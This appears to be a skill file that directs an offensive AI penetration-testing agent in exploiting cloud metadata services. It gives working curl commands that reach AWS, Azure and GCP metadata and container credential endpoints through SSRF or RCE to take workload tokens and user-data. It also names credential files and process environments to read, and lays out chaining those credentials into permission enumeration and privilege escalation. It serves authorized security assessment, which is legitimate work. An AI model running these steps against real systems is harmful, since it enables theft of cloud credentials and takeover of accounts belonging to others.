---
name: cloud-metadata-workload-identity
description: Cloud metadata and workload identity abuse — SSRF/file-read to AWS IMDSv1/IMDSv2, ECS task credentials, IRSA, Azure IMDS and Managed Identity, GCP metadata and GKE Workload Identity, chained to credentials, principal identification, permission enumeration, and privilege escalation
intent: offensive
assessment_mode: blackbox
provider:
  - aws
  - azure
  - gcp
---

# Cloud Metadata & Workload Identity

## Purpose
Turn any server-side request primitive (SSRF, code execution, file read, template injection) on a cloud-hosted workload into workload-identity credentials, then chain them into cloud control-plane access. "Metadata endpoint reachable" is never the stopping point.

## Entry Conditions
- A server-side primitive on a cloud-hosted target: SSRF, LFI/command-line file read, RCE, or header-controlled fetch
- No cloud credentials yet (this is the classic black-box → credentialed transition)

## Discovery Signals
- Target fingerprinted to a cloud provider (`cloud-attack-surface-discovery`)
- SSRF that can reach link-local addresses (169.254.169.254, 169.254.170.2, metadata.google.internal)
- Container/lambda/instance-like behavior (long-running processes, periodic tasks, upload pipelines)
- Error messages leaking `AWS_`/`AZURE_`/`GOOGLE_` environment variable names

## Attack Model

```text
application primitive (SSRF/RCE/file read)
→ metadata / credential endpoint
→ credential / token
→ identify principal (sts get-caller-identity / token audience)
→ enumerate permissions
→ access cloud resource / escalate
→ verified impact
```

## Methodology

### AWS — EC2 Instance Metadata
```bash
# IMDSv1 (trivially SSRF-able)
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE>   # AccessKeyId/SecretAccessKey/Token
# IMDSv2 requires a PUT token first — SSRF must support arbitrary methods
curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE>
# user-data frequently carries bootstrap credentials and secrets
curl -s http://169.254.169.254/latest/user-data
```
IMDSv2 is not "safe" by itself: if `HttpPutResponseHopLimit` > 1, a containerized/SSRF context can still mint a token and pull role creds. Test BOTH v1 and v2 before calling metadata access closed.

### AWS — Container Workloads
```bash
# ECS task credentials (task-metadata endpoint, second ENI IP range)
curl -s http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI
# EKS with IRSA: the pod token + role ARN live in the environment/filesystem when RCE exists
# Lambda: env vars reveal the runtime role; the keys themselves come via metadata
```

### Azure — IMDS and Managed Identity
```bash
# IMDS on any Azure VM/App Service/Functions
curl -s -H Metadata:true "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
# resource selection = audience selection: management.azure.com (ARM), graph.microsoft.com, <vault>.vault.azure.net
# App Service/Functions: also check $IDENTITY_ENDPOINT / $IDENTITY_HEADER env vars
# AKS workload identity: the bound SA token, fetched with the federated audience
```

### GCP — Metadata Server
```bash
curl -s -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
# Full tree: /instance/service-accounts/<SA>/..., scopes, email; /project/ for project ID
# GKE Workload Identity / Cloud Run / Cloud Functions: identity depends on the attached SA
```

### Chaining
Once a credential/token is obtained:
1. Identify the principal (`aws sts get-caller-identity`; decode Azure token aud/oid/roles; GCP: call the IAM APIs with the token)
2. Record audience/scopes — an Azure token is per-resource (see below)
3. Enumerate permissions (`aws iam simulate-principal-policy` where allowed, or probe-and-observe; Azure: Graph/ARM calls the token actually grants; GCP: `gcloud auth print-access-token` + `TestIamPermissions`)
4. Access the highest-value resources reachable; hand off to `cloud-credential-abuse` and the provider escalation skill

## Azure Token/Audience Rule
Never treat an Azure token as a generic credential. Before declaring it useless or powerful, determine `aud` (Graph vs ARM vs Key Vault), tenant, principal (user vs service principal vs managed identity), and the scp/roles claim. A Graph token does not grant ARM access; an ARM token does not grant Graph privileges; Key Vault has its own audience. Request the right audience from the metadata endpoint rather than assuming.

## Evidence Contract

```text
primitive observed (SSRF/RCE/LFI)
→ metadata endpoint reached (response contents recorded)
→ credential/token obtained (identifying attributes, not full secrets, in the report)
→ principal identified
→ concrete cloud action performed (resource listed/read/written)
→ report
```

**NOT evidence**: metadata endpoint reachable but no credential obtained (report the SSRF itself; the cloud chain is impact amplification), a credentials-file path visible without content, a token whose audience does not cover any reachable resource

## Common Misses
- IMDSv2 never attempted (PUT-token flow) when v1 fails
- `HttpPutResponseHopLimit` > 1 making v2 SSRF-able in containerized contexts
- ECS credential endpoint (169.254.170.2) skipped when 169.254.169.254 fails
- user-data never fetched
- Azure resource/audience selection — requesting only the default audience misses Key Vault/ARM
- GCP `Metadata-Flavor` header omitted (server requires it)
- File-read primitives: `~/.aws/credentials`, `/proc/*/environ`, app settings never read

## False Positives / Non-Findings
- Metadata endpoints returning 404/hop-limit errors (properly hardened)
- Tokens for identity federations with no privileges on any reachable resource
- Client-side (browser) requests to link-local ranges (no server-side fetch)

## Xalgorix Tool Strategy
- `http_request`/curl with full method/header control for IMDSv2
- `terminal_execute` with aws/az/gcloud CLIs once credentials land in the test environment
- Ledger: credential entry with principal, audience/scopes, and provenance

## Specialist Handoffs
- Obtained credentials → `cloud-credential-abuse`
- AWS escalation → `aws-iam-privilege-escalation`; Azure → `azure-privilege-escalation`; GCP → `gcp-iam-privilege-escalation`
- Kubernetes inside the cluster (post-IRSA/pod-token) → `container-security`

## Stopping Rule
Exhaust each provider's credential sources (IMDS v1+v2, user-data, container endpoints, env/filesystem via LFI/RCE) for the primitive at hand. Chain as far as runtime policy permits; if every source is hardened, the finding is the SSRF/RCE itself with metadata as context.